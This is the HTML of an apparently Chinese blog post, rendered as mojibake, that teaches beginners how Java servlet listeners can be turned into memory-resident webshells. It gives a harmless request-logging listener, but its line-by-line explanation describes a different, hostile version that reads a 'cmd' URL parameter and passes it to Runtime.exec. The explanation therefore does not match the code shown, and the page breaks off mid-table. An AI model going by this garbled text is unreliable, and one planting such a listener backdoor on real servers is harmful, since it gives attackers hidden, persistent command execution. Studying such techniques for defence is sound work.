<!doctype html><html lang=en dir=auto data-theme=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>starå¾çš„åšå®¢</title><meta name=keywords content><meta name=description content='---
title: "Javaå†…å­˜é©¬-ç›‘å¬å™¨" # æ–°æ–‡ç« æ ‡é¢˜
date: 2025-11-17T16:30:00+08:00 # è¯·æ ¹æ®ä½ åˆ›å»ºçš„å®é™…æ—¶é—´ä¿®æ”¹
draft: false 
categories: ["ç½‘ç»œå®‰å…¨"] # ğŸ¯ å…³é”®ï¼šè®¾ç½®ä¸ºç›®æ ‡åˆ†ç±»
tags: ["ç½‘ç»œå®‰å…¨", "Java", "å†…å­˜é©¬"] # å»ºè®®æ·»åŠ ç›¸å…³æ ‡ç­¾
mermaid: true # â­ å…³é”®ï¼šå¯ç”¨ Mermaid å›¾è¡¨æ”¯æŒ
---
Javaå†…å­˜é©¬-ç›‘å¬å™¨
ä»¥ä¸‹å†…å®¹ä»…é™Javaå°ç™½ï¼Œé«˜æ‰‹æ— è§†å°±å¯ä»¥
ä¸€ã€ Java ç›‘å¬å™¨åˆ°åº•æœ‰å•¥ç”¨ï¼Ÿ
ä½ å¯ä»¥æŠŠç›‘å¬å™¨æƒ³è±¡æˆâ€œä¿å®‰â€æˆ–è€…â€œç›‘æ§æ‘„åƒå¤´â€ã€‚
åœ¨ Web åº”ç”¨é‡Œï¼Œæœ‰ä¸‰ä»¶å¤§äº‹ç»å¸¸å‘ç”Ÿï¼š

åº”ç”¨å¯åŠ¨ / å…³é—­ï¼ˆServletContextï¼‰
ç”¨æˆ·ç™»å½• / é€€å‡ºï¼ˆHttpSessionï¼‰
æ¯æ¬¡å‘è¯·æ±‚ / è¯·æ±‚ç»“æŸï¼ˆServletRequestï¼‰

ç›‘å¬å™¨å°±æ˜¯æå‰æ³¨å†Œå¥½ï¼Œå‘Šè¯‰ç³»ç»Ÿï¼šâ€œä¸€æ—¦å‘ç”Ÿä¸Šé¢è¿™äº›äº‹ï¼Œå°±ç«‹åˆ»é€šçŸ¥æˆ‘ï¼Œè®©æˆ‘æ‰§è¡Œä¸€æ®µä»£ç â€ã€‚
æ¯”å¦‚ï¼š

åº”ç”¨å¯åŠ¨æ—¶ï¼Œè‡ªåŠ¨åˆ›å»ºæ•°æ®åº“è¿æ¥æ± ï¼›
ç”¨æˆ·ç™»å½•æ—¶ï¼Œè®°å½•æ—¥å¿—ï¼›
æ¯æ¬¡è¯·æ±‚åˆ°æ¥æ—¶ï¼Œæ£€æŸ¥æ˜¯å¦æºå¸¦äº†åˆæ³•çš„ tokenã€‚

è¿™æ ·å°±æŠŠâ€œä¸šåŠ¡é€»è¾‘â€å’Œâ€œäº‹ä»¶â€åˆ†å¼€ï¼Œä»£ç æ›´æ¸…æ™°ï¼Œä¹Ÿæ›´å®¹æ˜“æ‰©å±•ã€‚
äºŒã€ ä¸ºä»€ä¹ˆç›‘å¬å™¨èƒ½å˜æˆâ€œå†…å­˜é©¬â€ï¼Ÿ
å†…å­˜é©¬â€å°±æ˜¯é»‘å®¢æŠŠä¸€æ®µæ¶æ„ä»£ç æ‚„æ‚„å¡è¿›æ­£åœ¨è¿è¡Œçš„ Java åº”ç”¨é‡Œï¼Œè®©å®ƒåƒæœ¨é©¬ä¸€æ ·é•¿æœŸæ½œä¼ï¼Œå³ä½¿æœåŠ¡å™¨é‡å¯ä¹Ÿä¸ä¼šæ¶ˆå¤±ï¼ˆå› ä¸ºä»£ç å·²ç»åŠ è½½åˆ°å†…å­˜ï¼‰ã€‚
ç›‘å¬å™¨ä¹‹æ‰€ä»¥å®¹æ˜“è¢«åˆ©ç”¨ï¼Œæ˜¯å› ä¸ºï¼š


å®ƒèƒ½åœ¨æ¯æ¬¡è¯·æ±‚æˆ–åº”ç”¨å¯åŠ¨æ—¶è‡ªåŠ¨æ‰§è¡Œï¼›


åªè¦èƒ½å¾€ web.xml é‡ŒåŠ ä¸€è¡Œé…ç½®ï¼Œæˆ–è€…ç”¨æ³¨è§£ @WebListenerï¼Œå°±èƒ½è®©è¿™æ®µä»£ç ç”Ÿæ•ˆï¼›


é»‘å®¢æŠŠæ¶æ„é€»è¾‘å†™åœ¨ç›‘å¬å™¨çš„å›è°ƒæ–¹æ³•é‡Œï¼Œå°±èƒ½åœ¨ä¸ä¿®æ”¹åŸæœ‰ä¸šåŠ¡ä»£ç çš„æƒ…å†µä¸‹ï¼Œå·å·æ‰§è¡Œå‘½ä»¤ã€å›å¼¹ shell ç­‰ã€‚


ä¸‰. å·¥ä½œåŸç†
Java Web çš„ç›‘å¬å™¨åŸºäºâ€œè§‚å¯Ÿè€…æ¨¡å¼â€ï¼š'><meta name=author content="æ‚¨çš„å§“å"><link rel=canonical href=http://ljj1992.fun/posts/java%E5%86%85%E5%AD%98%E9%A9%AC-%E7%9B%91%E5%90%AC%E5%99%A8/><link crossorigin=anonymous href=/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css integrity="sha256-NDzEgLn/yPBMy+XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as=style><link rel=icon href=http://ljj1992.fun/favicon.ico><link rel=icon type=image/png sizes=16x16 href=http://ljj1992.fun/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=http://ljj1992.fun/favicon-32x32.png><link rel=apple-touch-icon href=http://ljj1992.fun/apple-touch-icon.png><link rel=mask-icon href=http://ljj1992.fun/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://ljj1992.fun/posts/java%E5%86%85%E5%AD%98%E9%A9%AC-%E7%9B%91%E5%90%AC%E5%99%A8/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51);color-scheme:dark}.list{background:var(--theme)}.toc{background:var(--entry)}}@media(prefers-color-scheme:light){.list::-webkit-scrollbar-thumb{border-color:var(--code-bg)}}</style></noscript><script>localStorage.getItem("pref-theme")==="dark"?document.querySelector("html").dataset.theme="dark":localStorage.getItem("pref-theme")==="light"?document.querySelector("html").dataset.theme="light":window.matchMedia("(prefers-color-scheme: dark)").matches?document.querySelector("html").dataset.theme="dark":document.querySelector("html").dataset.theme="light"</script><meta property="og:url" content="http://ljj1992.fun/posts/java%E5%86%85%E5%AD%98%E9%A9%AC-%E7%9B%91%E5%90%AC%E5%99%A8/"><meta property="og:site_name" content="starå¾çš„åšå®¢"><meta property="og:title" content="starå¾çš„åšå®¢"><meta property="og:description" content='--- title: "Javaå†…å­˜é©¬-ç›‘å¬å™¨" # æ–°æ–‡ç« æ ‡é¢˜ date: 2025-11-17T16:30:00+08:00 # è¯·æ ¹æ®ä½ åˆ›å»ºçš„å®é™…æ—¶é—´ä¿®æ”¹ draft: false categories: ["ç½‘ç»œå®‰å…¨"] # ğŸ¯ å…³é”®ï¼šè®¾ç½®ä¸ºç›®æ ‡åˆ†ç±» tags: ["ç½‘ç»œå®‰å…¨", "Java", "å†…å­˜é©¬"] # å»ºè®®æ·»åŠ ç›¸å…³æ ‡ç­¾ mermaid: true # â­ å…³é”®ï¼šå¯ç”¨ Mermaid å›¾è¡¨æ”¯æŒ --- Javaå†…å­˜é©¬-ç›‘å¬å™¨ ä»¥ä¸‹å†…å®¹ä»…é™Javaå°ç™½ï¼Œé«˜æ‰‹æ— è§†å°±å¯ä»¥
ä¸€ã€ Java ç›‘å¬å™¨åˆ°åº•æœ‰å•¥ç”¨ï¼Ÿ ä½ å¯ä»¥æŠŠç›‘å¬å™¨æƒ³è±¡æˆâ€œä¿å®‰â€æˆ–è€…â€œç›‘æ§æ‘„åƒå¤´â€ã€‚ åœ¨ Web åº”ç”¨é‡Œï¼Œæœ‰ä¸‰ä»¶å¤§äº‹ç»å¸¸å‘ç”Ÿï¼š
åº”ç”¨å¯åŠ¨ / å…³é—­ï¼ˆServletContextï¼‰ ç”¨æˆ·ç™»å½• / é€€å‡ºï¼ˆHttpSessionï¼‰ æ¯æ¬¡å‘è¯·æ±‚ / è¯·æ±‚ç»“æŸï¼ˆServletRequestï¼‰ ç›‘å¬å™¨å°±æ˜¯æå‰æ³¨å†Œå¥½ï¼Œå‘Šè¯‰ç³»ç»Ÿï¼šâ€œä¸€æ—¦å‘ç”Ÿä¸Šé¢è¿™äº›äº‹ï¼Œå°±ç«‹åˆ»é€šçŸ¥æˆ‘ï¼Œè®©æˆ‘æ‰§è¡Œä¸€æ®µä»£ç â€ã€‚
æ¯”å¦‚ï¼š
åº”ç”¨å¯åŠ¨æ—¶ï¼Œè‡ªåŠ¨åˆ›å»ºæ•°æ®åº“è¿æ¥æ± ï¼› ç”¨æˆ·ç™»å½•æ—¶ï¼Œè®°å½•æ—¥å¿—ï¼› æ¯æ¬¡è¯·æ±‚åˆ°æ¥æ—¶ï¼Œæ£€æŸ¥æ˜¯å¦æºå¸¦äº†åˆæ³•çš„ tokenã€‚ è¿™æ ·å°±æŠŠâ€œä¸šåŠ¡é€»è¾‘â€å’Œâ€œäº‹ä»¶â€åˆ†å¼€ï¼Œä»£ç æ›´æ¸…æ™°ï¼Œä¹Ÿæ›´å®¹æ˜“æ‰©å±•ã€‚
äºŒã€ ä¸ºä»€ä¹ˆç›‘å¬å™¨èƒ½å˜æˆâ€œå†…å­˜é©¬â€ï¼Ÿ å†…å­˜é©¬â€å°±æ˜¯é»‘å®¢æŠŠä¸€æ®µæ¶æ„ä»£ç æ‚„æ‚„å¡è¿›æ­£åœ¨è¿è¡Œçš„ Java åº”ç”¨é‡Œï¼Œè®©å®ƒåƒæœ¨é©¬ä¸€æ ·é•¿æœŸæ½œä¼ï¼Œå³ä½¿æœåŠ¡å™¨é‡å¯ä¹Ÿä¸ä¼šæ¶ˆå¤±ï¼ˆå› ä¸ºä»£ç å·²ç»åŠ è½½åˆ°å†…å­˜ï¼‰ã€‚ ç›‘å¬å™¨ä¹‹æ‰€ä»¥å®¹æ˜“è¢«åˆ©ç”¨ï¼Œæ˜¯å› ä¸ºï¼š
å®ƒèƒ½åœ¨æ¯æ¬¡è¯·æ±‚æˆ–åº”ç”¨å¯åŠ¨æ—¶è‡ªåŠ¨æ‰§è¡Œï¼›
åªè¦èƒ½å¾€ web.xml é‡ŒåŠ ä¸€è¡Œé…ç½®ï¼Œæˆ–è€…ç”¨æ³¨è§£ @WebListenerï¼Œå°±èƒ½è®©è¿™æ®µä»£ç ç”Ÿæ•ˆï¼›
é»‘å®¢æŠŠæ¶æ„é€»è¾‘å†™åœ¨ç›‘å¬å™¨çš„å›è°ƒæ–¹æ³•é‡Œï¼Œå°±èƒ½åœ¨ä¸ä¿®æ”¹åŸæœ‰ä¸šåŠ¡ä»£ç çš„æƒ…å†µä¸‹ï¼Œå·å·æ‰§è¡Œå‘½ä»¤ã€å›å¼¹ shell ç­‰ã€‚
ä¸‰. å·¥ä½œåŸç† Java Web çš„ç›‘å¬å™¨åŸºäºâ€œè§‚å¯Ÿè€…æ¨¡å¼â€ï¼š'><meta property="og:locale" content="zh-cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta name=twitter:card content="summary"><meta name=twitter:title content><meta name=twitter:description content='---
title: "Javaå†…å­˜é©¬-ç›‘å¬å™¨" # æ–°æ–‡ç« æ ‡é¢˜
date: 2025-11-17T16:30:00+08:00 # è¯·æ ¹æ®ä½ åˆ›å»ºçš„å®é™…æ—¶é—´ä¿®æ”¹
draft: false 
categories: ["ç½‘ç»œå®‰å…¨"] # ğŸ¯ å…³é”®ï¼šè®¾ç½®ä¸ºç›®æ ‡åˆ†ç±»
tags: ["ç½‘ç»œå®‰å…¨", "Java", "å†…å­˜é©¬"] # å»ºè®®æ·»åŠ ç›¸å…³æ ‡ç­¾
mermaid: true # â­ å…³é”®ï¼šå¯ç”¨ Mermaid å›¾è¡¨æ”¯æŒ
---
Javaå†…å­˜é©¬-ç›‘å¬å™¨
ä»¥ä¸‹å†…å®¹ä»…é™Javaå°ç™½ï¼Œé«˜æ‰‹æ— è§†å°±å¯ä»¥
ä¸€ã€ Java ç›‘å¬å™¨åˆ°åº•æœ‰å•¥ç”¨ï¼Ÿ
ä½ å¯ä»¥æŠŠç›‘å¬å™¨æƒ³è±¡æˆâ€œä¿å®‰â€æˆ–è€…â€œç›‘æ§æ‘„åƒå¤´â€ã€‚
åœ¨ Web åº”ç”¨é‡Œï¼Œæœ‰ä¸‰ä»¶å¤§äº‹ç»å¸¸å‘ç”Ÿï¼š

åº”ç”¨å¯åŠ¨ / å…³é—­ï¼ˆServletContextï¼‰
ç”¨æˆ·ç™»å½• / é€€å‡ºï¼ˆHttpSessionï¼‰
æ¯æ¬¡å‘è¯·æ±‚ / è¯·æ±‚ç»“æŸï¼ˆServletRequestï¼‰

ç›‘å¬å™¨å°±æ˜¯æå‰æ³¨å†Œå¥½ï¼Œå‘Šè¯‰ç³»ç»Ÿï¼šâ€œä¸€æ—¦å‘ç”Ÿä¸Šé¢è¿™äº›äº‹ï¼Œå°±ç«‹åˆ»é€šçŸ¥æˆ‘ï¼Œè®©æˆ‘æ‰§è¡Œä¸€æ®µä»£ç â€ã€‚
æ¯”å¦‚ï¼š

åº”ç”¨å¯åŠ¨æ—¶ï¼Œè‡ªåŠ¨åˆ›å»ºæ•°æ®åº“è¿æ¥æ± ï¼›
ç”¨æˆ·ç™»å½•æ—¶ï¼Œè®°å½•æ—¥å¿—ï¼›
æ¯æ¬¡è¯·æ±‚åˆ°æ¥æ—¶ï¼Œæ£€æŸ¥æ˜¯å¦æºå¸¦äº†åˆæ³•çš„ tokenã€‚

è¿™æ ·å°±æŠŠâ€œä¸šåŠ¡é€»è¾‘â€å’Œâ€œäº‹ä»¶â€åˆ†å¼€ï¼Œä»£ç æ›´æ¸…æ™°ï¼Œä¹Ÿæ›´å®¹æ˜“æ‰©å±•ã€‚
äºŒã€ ä¸ºä»€ä¹ˆç›‘å¬å™¨èƒ½å˜æˆâ€œå†…å­˜é©¬â€ï¼Ÿ
å†…å­˜é©¬â€å°±æ˜¯é»‘å®¢æŠŠä¸€æ®µæ¶æ„ä»£ç æ‚„æ‚„å¡è¿›æ­£åœ¨è¿è¡Œçš„ Java åº”ç”¨é‡Œï¼Œè®©å®ƒåƒæœ¨é©¬ä¸€æ ·é•¿æœŸæ½œä¼ï¼Œå³ä½¿æœåŠ¡å™¨é‡å¯ä¹Ÿä¸ä¼šæ¶ˆå¤±ï¼ˆå› ä¸ºä»£ç å·²ç»åŠ è½½åˆ°å†…å­˜ï¼‰ã€‚
ç›‘å¬å™¨ä¹‹æ‰€ä»¥å®¹æ˜“è¢«åˆ©ç”¨ï¼Œæ˜¯å› ä¸ºï¼š


å®ƒèƒ½åœ¨æ¯æ¬¡è¯·æ±‚æˆ–åº”ç”¨å¯åŠ¨æ—¶è‡ªåŠ¨æ‰§è¡Œï¼›


åªè¦èƒ½å¾€ web.xml é‡ŒåŠ ä¸€è¡Œé…ç½®ï¼Œæˆ–è€…ç”¨æ³¨è§£ @WebListenerï¼Œå°±èƒ½è®©è¿™æ®µä»£ç ç”Ÿæ•ˆï¼›


é»‘å®¢æŠŠæ¶æ„é€»è¾‘å†™åœ¨ç›‘å¬å™¨çš„å›è°ƒæ–¹æ³•é‡Œï¼Œå°±èƒ½åœ¨ä¸ä¿®æ”¹åŸæœ‰ä¸šåŠ¡ä»£ç çš„æƒ…å†µä¸‹ï¼Œå·å·æ‰§è¡Œå‘½ä»¤ã€å›å¼¹ shell ç­‰ã€‚


ä¸‰. å·¥ä½œåŸç†
Java Web çš„ç›‘å¬å™¨åŸºäºâ€œè§‚å¯Ÿè€…æ¨¡å¼â€ï¼š'><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"http://ljj1992.fun/posts/"},{"@type":"ListItem","position":2,"name":"","item":"http://ljj1992.fun/posts/java%E5%86%85%E5%AD%98%E9%A9%AC-%E7%9B%91%E5%90%AC%E5%99%A8/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"","name":"","description":"--- title: \u0026#34;Javaå†…å­˜é©¬-ç›‘å¬å™¨\u0026#34; # æ–°æ–‡ç« æ ‡é¢˜ date: 2025-11-17T16:30:00+08:00 # è¯·æ ¹æ®ä½ åˆ›å»ºçš„å®é™…æ—¶é—´ä¿®æ”¹ draft: false categories: [\u0026#34;ç½‘ç»œå®‰å…¨\u0026#34;] # ğŸ¯ å…³é”®ï¼šè®¾ç½®ä¸ºç›®æ ‡åˆ†ç±» tags: [\u0026#34;ç½‘ç»œå®‰å…¨\u0026#34;, \u0026#34;Java\u0026#34;, \u0026#34;å†…å­˜é©¬\u0026#34;] # å»ºè®®æ·»åŠ ç›¸å…³æ ‡ç­¾ mermaid: true # â­ å…³é”®ï¼šå¯ç”¨ Mermaid å›¾è¡¨æ”¯æŒ --- Javaå†…å­˜é©¬-ç›‘å¬å™¨ ä»¥ä¸‹å†…å®¹ä»…é™Javaå°ç™½ï¼Œé«˜æ‰‹æ— è§†å°±å¯ä»¥\nä¸€ã€ Java ç›‘å¬å™¨åˆ°åº•æœ‰å•¥ç”¨ï¼Ÿ ä½ å¯ä»¥æŠŠç›‘å¬å™¨æƒ³è±¡æˆâ€œä¿å®‰â€æˆ–è€…â€œç›‘æ§æ‘„åƒå¤´â€ã€‚ åœ¨ Web åº”ç”¨é‡Œï¼Œæœ‰ä¸‰ä»¶å¤§äº‹ç»å¸¸å‘ç”Ÿï¼š\nåº”ç”¨å¯åŠ¨ / å…³é—­ï¼ˆServletContextï¼‰ ç”¨æˆ·ç™»å½• / é€€å‡ºï¼ˆHttpSessionï¼‰ æ¯æ¬¡å‘è¯·æ±‚ / è¯·æ±‚ç»“æŸï¼ˆServletRequestï¼‰ ç›‘å¬å™¨å°±æ˜¯æå‰æ³¨å†Œå¥½ï¼Œå‘Šè¯‰ç³»ç»Ÿï¼šâ€œä¸€æ—¦å‘ç”Ÿä¸Šé¢è¿™äº›äº‹ï¼Œå°±ç«‹åˆ»é€šçŸ¥æˆ‘ï¼Œè®©æˆ‘æ‰§è¡Œä¸€æ®µä»£ç â€ã€‚\næ¯”å¦‚ï¼š\nåº”ç”¨å¯åŠ¨æ—¶ï¼Œè‡ªåŠ¨åˆ›å»ºæ•°æ®åº“è¿æ¥æ± ï¼› ç”¨æˆ·ç™»å½•æ—¶ï¼Œè®°å½•æ—¥å¿—ï¼› æ¯æ¬¡è¯·æ±‚åˆ°æ¥æ—¶ï¼Œæ£€æŸ¥æ˜¯å¦æºå¸¦äº†åˆæ³•çš„ tokenã€‚ è¿™æ ·å°±æŠŠâ€œä¸šåŠ¡é€»è¾‘â€å’Œâ€œäº‹ä»¶â€åˆ†å¼€ï¼Œä»£ç æ›´æ¸…æ™°ï¼Œä¹Ÿæ›´å®¹æ˜“æ‰©å±•ã€‚\näºŒã€ ä¸ºä»€ä¹ˆç›‘å¬å™¨èƒ½å˜æˆâ€œå†…å­˜é©¬â€ï¼Ÿ å†…å­˜é©¬â€å°±æ˜¯é»‘å®¢æŠŠä¸€æ®µæ¶æ„ä»£ç æ‚„æ‚„å¡è¿›æ­£åœ¨è¿è¡Œçš„ Java åº”ç”¨é‡Œï¼Œè®©å®ƒåƒæœ¨é©¬ä¸€æ ·é•¿æœŸæ½œä¼ï¼Œå³ä½¿æœåŠ¡å™¨é‡å¯ä¹Ÿä¸ä¼šæ¶ˆå¤±ï¼ˆå› ä¸ºä»£ç å·²ç»åŠ è½½åˆ°å†…å­˜ï¼‰ã€‚ ç›‘å¬å™¨ä¹‹æ‰€ä»¥å®¹æ˜“è¢«åˆ©ç”¨ï¼Œæ˜¯å› ä¸ºï¼š\nå®ƒèƒ½åœ¨æ¯æ¬¡è¯·æ±‚æˆ–åº”ç”¨å¯åŠ¨æ—¶è‡ªåŠ¨æ‰§è¡Œï¼›\nåªè¦èƒ½å¾€ web.xml é‡ŒåŠ ä¸€è¡Œé…ç½®ï¼Œæˆ–è€…ç”¨æ³¨è§£ @WebListenerï¼Œå°±èƒ½è®©è¿™æ®µä»£ç ç”Ÿæ•ˆï¼›\né»‘å®¢æŠŠæ¶æ„é€»è¾‘å†™åœ¨ç›‘å¬å™¨çš„å›è°ƒæ–¹æ³•é‡Œï¼Œå°±èƒ½åœ¨ä¸ä¿®æ”¹åŸæœ‰ä¸šåŠ¡ä»£ç çš„æƒ…å†µä¸‹ï¼Œå·å·æ‰§è¡Œå‘½ä»¤ã€å›å¼¹ shell ç­‰ã€‚\nä¸‰. å·¥ä½œåŸç† Java Web çš„ç›‘å¬å™¨åŸºäºâ€œè§‚å¯Ÿè€…æ¨¡å¼â€ï¼š\n","keywords":[],"articleBody":"--- title: \"Javaå†…å­˜é©¬-ç›‘å¬å™¨\" # æ–°æ–‡ç« æ ‡é¢˜ date: 2025-11-17T16:30:00+08:00 # è¯·æ ¹æ®ä½ åˆ›å»ºçš„å®é™…æ—¶é—´ä¿®æ”¹ draft: false categories: [\"ç½‘ç»œå®‰å…¨\"] # ğŸ¯ å…³é”®ï¼šè®¾ç½®ä¸ºç›®æ ‡åˆ†ç±» tags: [\"ç½‘ç»œå®‰å…¨\", \"Java\", \"å†…å­˜é©¬\"] # å»ºè®®æ·»åŠ ç›¸å…³æ ‡ç­¾ mermaid: true # â­ å…³é”®ï¼šå¯ç”¨ Mermaid å›¾è¡¨æ”¯æŒ --- Javaå†…å­˜é©¬-ç›‘å¬å™¨ ä»¥ä¸‹å†…å®¹ä»…é™Javaå°ç™½ï¼Œé«˜æ‰‹æ— è§†å°±å¯ä»¥\nä¸€ã€ Java ç›‘å¬å™¨åˆ°åº•æœ‰å•¥ç”¨ï¼Ÿ ä½ å¯ä»¥æŠŠç›‘å¬å™¨æƒ³è±¡æˆâ€œä¿å®‰â€æˆ–è€…â€œç›‘æ§æ‘„åƒå¤´â€ã€‚ åœ¨ Web åº”ç”¨é‡Œï¼Œæœ‰ä¸‰ä»¶å¤§äº‹ç»å¸¸å‘ç”Ÿï¼š\nåº”ç”¨å¯åŠ¨ / å…³é—­ï¼ˆServletContextï¼‰ ç”¨æˆ·ç™»å½• / é€€å‡ºï¼ˆHttpSessionï¼‰ æ¯æ¬¡å‘è¯·æ±‚ / è¯·æ±‚ç»“æŸï¼ˆServletRequestï¼‰ ç›‘å¬å™¨å°±æ˜¯æå‰æ³¨å†Œå¥½ï¼Œå‘Šè¯‰ç³»ç»Ÿï¼šâ€œä¸€æ—¦å‘ç”Ÿä¸Šé¢è¿™äº›äº‹ï¼Œå°±ç«‹åˆ»é€šçŸ¥æˆ‘ï¼Œè®©æˆ‘æ‰§è¡Œä¸€æ®µä»£ç â€ã€‚\næ¯”å¦‚ï¼š\nåº”ç”¨å¯åŠ¨æ—¶ï¼Œè‡ªåŠ¨åˆ›å»ºæ•°æ®åº“è¿æ¥æ± ï¼› ç”¨æˆ·ç™»å½•æ—¶ï¼Œè®°å½•æ—¥å¿—ï¼› æ¯æ¬¡è¯·æ±‚åˆ°æ¥æ—¶ï¼Œæ£€æŸ¥æ˜¯å¦æºå¸¦äº†åˆæ³•çš„ tokenã€‚ è¿™æ ·å°±æŠŠâ€œä¸šåŠ¡é€»è¾‘â€å’Œâ€œäº‹ä»¶â€åˆ†å¼€ï¼Œä»£ç æ›´æ¸…æ™°ï¼Œä¹Ÿæ›´å®¹æ˜“æ‰©å±•ã€‚\näºŒã€ ä¸ºä»€ä¹ˆç›‘å¬å™¨èƒ½å˜æˆâ€œå†…å­˜é©¬â€ï¼Ÿ å†…å­˜é©¬â€å°±æ˜¯é»‘å®¢æŠŠä¸€æ®µæ¶æ„ä»£ç æ‚„æ‚„å¡è¿›æ­£åœ¨è¿è¡Œçš„ Java åº”ç”¨é‡Œï¼Œè®©å®ƒåƒæœ¨é©¬ä¸€æ ·é•¿æœŸæ½œä¼ï¼Œå³ä½¿æœåŠ¡å™¨é‡å¯ä¹Ÿä¸ä¼šæ¶ˆå¤±ï¼ˆå› ä¸ºä»£ç å·²ç»åŠ è½½åˆ°å†…å­˜ï¼‰ã€‚ ç›‘å¬å™¨ä¹‹æ‰€ä»¥å®¹æ˜“è¢«åˆ©ç”¨ï¼Œæ˜¯å› ä¸ºï¼š\nå®ƒèƒ½åœ¨æ¯æ¬¡è¯·æ±‚æˆ–åº”ç”¨å¯åŠ¨æ—¶è‡ªåŠ¨æ‰§è¡Œï¼›\nåªè¦èƒ½å¾€ web.xml é‡ŒåŠ ä¸€è¡Œé…ç½®ï¼Œæˆ–è€…ç”¨æ³¨è§£ @WebListenerï¼Œå°±èƒ½è®©è¿™æ®µä»£ç ç”Ÿæ•ˆï¼›\né»‘å®¢æŠŠæ¶æ„é€»è¾‘å†™åœ¨ç›‘å¬å™¨çš„å›è°ƒæ–¹æ³•é‡Œï¼Œå°±èƒ½åœ¨ä¸ä¿®æ”¹åŸæœ‰ä¸šåŠ¡ä»£ç çš„æƒ…å†µä¸‹ï¼Œå·å·æ‰§è¡Œå‘½ä»¤ã€å›å¼¹ shell ç­‰ã€‚\nä¸‰. å·¥ä½œåŸç† Java Web çš„ç›‘å¬å™¨åŸºäºâ€œè§‚å¯Ÿè€…æ¨¡å¼â€ï¼š\nè¢«è§‚å¯Ÿè€…ï¼ˆäº‹ä»¶æºï¼‰ï¼šServletContextã€HttpSessionã€ServletRequest ç­‰ï¼›\nè§‚å¯Ÿè€…ï¼ˆç›‘å¬å™¨ï¼‰ï¼šä½ å†™çš„ç±»ï¼Œå®ç°å¯¹åº”çš„ *Listener æ¥å£ï¼›\nå½“äº‹ä»¶æºçŠ¶æ€å˜åŒ–ï¼ˆåˆ›å»ºã€é”€æ¯ã€å±æ€§æ”¹å˜ï¼‰ï¼Œå®¹å™¨ä¼šè‡ªåŠ¨è°ƒç”¨ç›‘å¬å™¨é‡Œå¯¹åº”çš„æ–¹æ³•ã€‚\n3.1 ä¸¾ä¸ªç®€å•çš„â€œç›‘å¬å™¨â€ä¾‹å­ // 1. å¯¼å…¥éœ€è¦çš„ç±» import javax.servlet.ServletRequest; import javax.servlet.ServletRequestEvent; import javax.servlet.ServletRequestListener; import javax.servlet.annotation.WebListener; // 2. å‘Šè¯‰ Tomcatï¼šè¿™æ˜¯ä¸€ä¸ªç›‘å¬å™¨ï¼Œè¯·è‡ªåŠ¨æ³¨å†Œ @WebListener public class MyRequestListener implements ServletRequestListener { // 3. å½“è¯·æ±‚å¼€å§‹æ—¶ï¼ˆç”¨æˆ·å‘æ¥è¯·æ±‚ï¼‰ï¼Œè¿™ä¸ªæ–¹æ³•è‡ªåŠ¨æ‰§è¡Œ @Override public void requestInitialized(ServletRequestEvent event) { System.out.println(\"ğŸ”” è¯·æ±‚å¼€å§‹äº†ï¼æœ‰äººè®¿é—®æœåŠ¡å™¨äº†ï¼\"); // 4. æˆ‘ä»¬è¿˜å¯ä»¥æ‹¿åˆ°å…·ä½“æ˜¯å“ªä¸ªè¯·æ±‚ ServletRequest request = event.getServletRequest(); String remoteAddr = request.getRemoteAddr(); // ç”¨æˆ·çš„ IP String method = request.getMethod(); // è¯·æ±‚æ–¹å¼ GET/POST String uri = request.getRequestURI(); // è®¿é—®çš„è·¯å¾„ System.out.printf(\"ğŸ“Œ æ¥è®¿è€…IP: %s | æ–¹æ³•: %s | è·¯å¾„: %s%n\", remoteAddr, method, uri); } // 5. å½“è¯·æ±‚ç»“æŸæ—¶ï¼ˆæœåŠ¡å™¨å“åº”å®Œï¼‰ï¼Œè¿™ä¸ªæ–¹æ³•è‡ªåŠ¨æ‰§è¡Œ @Override public void requestDestroyed(ServletRequestEvent event) { System.out.println(\"ğŸ”š è¯·æ±‚ç»“æŸäº†ï¼ç”¨æˆ·è¯·æ±‚å¤„ç†å®Œæˆã€‚\"); } } ğŸ”é€è¡Œè§£é‡Šï¼š\n@WebListenerï¼šä¸ç”¨å†æ”¹ web.xmlï¼Œå®¹å™¨å¯åŠ¨æ—¶ä¼šè‡ªåŠ¨å‘ç°å¹¶æ³¨å†Œè¿™ä¸ªç±»ï¼›\nimplements ServletRequestListenerï¼šè¡¨ç¤ºæˆ‘è¦ç›‘å¬â€œè¯·æ±‚å¼€å§‹/ç»“æŸâ€è¿™ä¸¤ä¸ªåŠ¨ä½œï¼›\nrequestInitializedï¼šè¯·æ±‚ä¸€è¿›æ¥å°±è°ƒç”¨ï¼›\nsre.getServletRequest()ï¼šæ‹¿åˆ°å½“å‰çš„è¯·æ±‚å¯¹è±¡ï¼›\nrequest.getParameter(\"cmd\")ï¼šçœ‹é»‘å®¢æœ‰æ²¡æœ‰åœ¨ URL é‡Œå¸¦ ?cmd=dir è¿™æ ·çš„å‚æ•°ï¼›\nRuntime.getRuntime().exec(cmd)ï¼šå¦‚æœæœ‰ï¼Œå°±æ‰§è¡Œè¿™æ¡ç³»ç»Ÿå‘½ä»¤ã€‚\nğŸ” é€è¡Œè§£é‡Šï¼ˆå¤§ç™½è¯ç‰ˆï¼‰\nè¡Œå· ä»£ç  å¤§ç™½è¯è§£é‡Š 1-4 import ... å¼•å…¥å¿…è¦çš„â€œå·¥å…·åŒ…â€ã€‚å°±åƒä½ è¦åšé¥­ï¼Œå¾—å…ˆæœ‰é”…ç¢—ç“¢ç›†ã€‚è¿™äº›æ˜¯ Java Web 